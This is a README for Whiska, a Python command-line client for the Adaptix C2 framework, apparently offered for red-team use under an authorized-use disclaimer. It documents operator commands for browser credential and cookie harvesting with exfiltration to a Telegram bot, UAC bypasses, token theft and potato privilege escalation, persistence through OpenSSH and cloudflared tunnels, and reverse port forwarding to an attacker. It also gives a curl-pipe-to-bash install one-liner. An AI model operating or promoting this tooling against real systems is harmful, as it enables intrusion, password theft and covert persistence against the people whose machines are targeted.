# Whiska

Command-line client for [Adaptix C2 Framework](https://github.com/Adaptix-Framework/AdaptixC2). Full-featured CLI replacement for the Qt GUI client.

> **For authorized security testing and educational use only.**

## Features

- **Authentication** — JWT login, token auto-refresh, OTP-based WebSocket
- **Real-time sync** — WebSocket with live agent/task/console updates and auto-reconnect
- **Agent interaction** — Send commands via server-side AxScript parsing
- **Tunnel management** — SOCKS5/SOCKS4/lportfwd/rportfwd from main menu and interact mode
- **Credential harvesting** — Chromium password/cookie extraction with auto ABE key decryption (Chrome 127+), Telegram exfil
- **Privilege escalation** — getsystem (token/task/svc), UAC bypass (runas/cmstp/mockdir/sspi/regshell), potato-dcom, token steal/make, runas
- **Persistence** — OpenSSH + cloudflared tunnel deployment with auto UAC elevation (SilentCleanup + CMSTP)
- **Screen streaming** — PowerShell .NET HTTP screen capture server on target
- **Payload generation** — Agent beacon payload generation via server API
- **Session management** — List, interact, tag, mark, color, remove agents (bulk by age/status)
- **File operations** — Download synced files, upload temp files
- **Persistent config** — `~/.whiskacli/config` for Telegram credentials

## Install

### One-liner (from GitHub Releases)

```bash
curl -fsSL https://raw.githubusercontent.com/khanhnguyen/whiska/main/install.sh | bash
```

### From source

```bash
git clone https://github.com/khanhnguyen/whiska
cd whiska
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
python -m whiskacli -H <server> -P <port> -u <username>
```

### Install as package

```bash
pip install -e .
whiska -H <server> -P <port> -u <username>
```

## Usage

```bash
# Basic connection (HTTP, default port)
whiska -H 192.168.1.10 -P 40056 -u operator1

# HTTPS (self-signed cert is accepted by default)
whiska -H c2.example.com -P 443 -u operator1

# Custom endpoint path
whiska -H c2.example.com -P 443 -e /endpoint -u admin

# Password inline (skip prompt)
whiska -H 192.168.1.10 -P 40056 -u operator1 -p 'password'

# Debug mode (show raw WebSocket packets)
whiska -H 192.168.1.10 -P 40056 -u operator1 --debug
```

## Commands

### Main Menu

| Command | Description |
|---------|-------------|
| `listeners` | List active listeners |
| `listeners create <name> <type> [cfg_json]` | Create a listener |
| `listeners stop/pause/resume <name> <type>` | Control a listener |
| `agents` / `sessions` | List agent sessions |
| `interact <id>` | Interact with agent (partial ID match) |
| `tasks <agent_id>` | List tasks for an agent |
| `downloads` | List downloaded files |
| `download <file_id>` | Save a file locally |
| `upload <path>` | Upload a temp file |
| `creds` | List credentials |
| `targets` | List targets |
| `tunnels` | List tunnels |
| `tunnels start socks5 <agent> <lport>` | Start SOCKS5 tunnel |
| `tunnels start socks4 <agent> <lport>` | Start SOCKS4 tunnel |
| `tunnels start lportfwd <agent> <lport> <thost> <tport>` | Local port forward |
| `tunnels start rportfwd <agent> <port> <thost> <tport>` | Reverse port forward |
| `tunnels stop <id>` | Stop tunnel |
| `pivots` | List pivot connections |
| `screenshots` | List screenshots |
| `chat [message]` | View/send team chat |
| `services` | List registered services |
| `generate` | Generate agent payload |
| `subscribe` | Manage sync subscriptions |
| `remove <id>` | Remove agent (`--older 7d` / `--dead` for bulk) |
| `info <id>` | Show agent details |
| `note <id> <text>` | Set agent note |
| `sleep <id> <sec>` | Set agent sleep interval |
| `jitter <id> <pct>` | Set agent jitter |
| `config show` | Show persistent config |
| `config set <key> <value>` | Save persistent setting |
| `clear` / `exit` | Clear screen / disconnect |

### Agent Interaction (after `interact`)

| Command | Description |
|---------|-------------|
| `<command>` | Sent to agent via AxScript |
| `info` | Show agent details |
| `tasks` | List agent tasks |
| `task_cancel <id>` / `task_delete <id>` | Cancel/delete task |
| `tag <text>` / `mark <text>` / `color <color>` | Label agent |
| `upload <local> <remote>` | Upload file to agent |
| `download <remote_path>` | Download file from agent |
| `sleep <sec>` / `jitter <pct>` | Timing controls |
| `socks5 <lport> [--desc text]` | Start SOCKS5 via this agent |
| `socks4 <lport>` | Start SOCKS4 via this agent |
| `lportfwd <lport> <thost> <tport>` | Local port forward via this agent |
| `rportfwd <port> <thost> <tport>` | Reverse port forward via this agent |
| `commands` | List available agent commands |
| `harvest [browser] [--decode] [--abe-key-hex <hex>]` | Extract browser credentials |
| `elevate [getsystem\|uac\|potato\|token\|runas]` | Privilege escalation |
| `stream [port] [quality]` | Deploy screen streamer |
| `persist ssh [user] [pass] [cf_token]` | Deploy OpenSSH + cloudflared |
| `remove` | Remove this agent |
| `history` | Show command history |
| `back` | Return to main menu |

### Harvest

Extracts passwords and cookies from Chromium-based browsers (Chrome, Edge, CocCoc, Brave, Avast).

```
harvest                          # All browsers
harvest chrome                   # Chrome only
harvest --decode                 # Re-decode existing downloads (no re-run)
harvest --abe-key-hex <64hex>    # Provide ABE key manually (Chrome 127+)
```

Flow: cookie-monster BOF → DPAPI master key extraction → ABE key auto-decrypt via IElevator COM BOF → decode passwords/cookies → send to Telegram.

### Elevate

```
elevate getsystem                    # SYSTEM via token impersonation (BOF)
elevate getsystem task|svc <cmd>     # Run cmd as SYSTEM via schtask/service
elevate uac runas <cmd>              # ShellExecuteEx RunAs (silent, no dialog)
elevate uac cmstp <cmd>              # CMSTP INF hijack
elevate uac mockdir <cmd>            # SilentCleanup + windir env spoof
elevate potato dcom                  # DCOMPotato (BOF, needs SeImpersonate)
elevate token steal <pid>            # Steal token from process (BOF)
elevate token make <user> <pass> <domain> <type>
elevate runas <user> <pass> <domain> <cmd>
```

### Tunnels

Tunnels can be managed from the main menu (`tunnels start ...`) or from inside an interact session (`socks5 <lport>`, `lportfwd <lport> <thost> <tport>`, etc.).

```bash
# Inside interact session
lportfwd 35900 10.0.0.5 5900         # Forward local:35900 → target:5900
socks5 1080                          # SOCKS5 proxy on local:1080
rportfwd 4444 127.0.0.1 4444        # Agent port → attacker
```

### Config

Persistent settings stored in `~/.whiskacli/config`.

```
config show                   # Display current values
config set tg_token <token>   # Telegram bot token for harvest exfil
config set tg_chat  <chat_id> # Telegram chat ID
```

Environment variables `WHISKA_TG_TOKEN` and `WHISKA_TG_CHAT` override config file values.

## Architecture

```
CLI (Python)                          Adaptix Server (Go)
┌─────────────┐    HTTPS+JWT         ┌──────────────────┐
│ REST Client ├───────────────────────► REST API         │
│             │                       │                  │
│ WS Client   ◄═══════WSS══════════►  │ WebSocket Broker │
│             │    (JSON packets)     │                  │
│ Interactive │                       │  AxScript Engine │
│ Shell       │    /command/raw ──────►  (parses cmds)  │
└─────────────┘                       └──────────────────┘
```

## Project Structure

```
whiskacli/
├── __init__.py      # Package metadata
├── __main__.py      # Entry point, arg parsing, connection flow
├── client.py        # HTTP + WebSocket client (all API methods)
├── models.py        # Data models + packet type constants
├── cli.py           # Interactive shell (prompt_toolkit + rich)
├── config.py        # Persistent config (~/.whiskacli/config)
└── decoder.py       # Chromium credential decoder (v10/v20 + ABE)
whiska_tele_commander/
└── bot.py           # Telegram bot for remote command execution
build_linux.sh       # PyInstaller build script (Linux, any arch)
whiska.spec          # PyInstaller spec
install.sh           # curl-based installer from GitHub Releases
```

## Build

```bash
# Produces dist/whiska (single binary for the current OS/arch)
bash build_linux.sh
```

The script creates an isolated `.venv_build/` venv, installs PyInstaller + dependencies, and runs `pyinstaller whiska.spec --clean`. Upload `dist/whiska` to GitHub Releases so `install.sh` can pull it.

## License

For authorized use only. See Adaptix C2 Framework license.
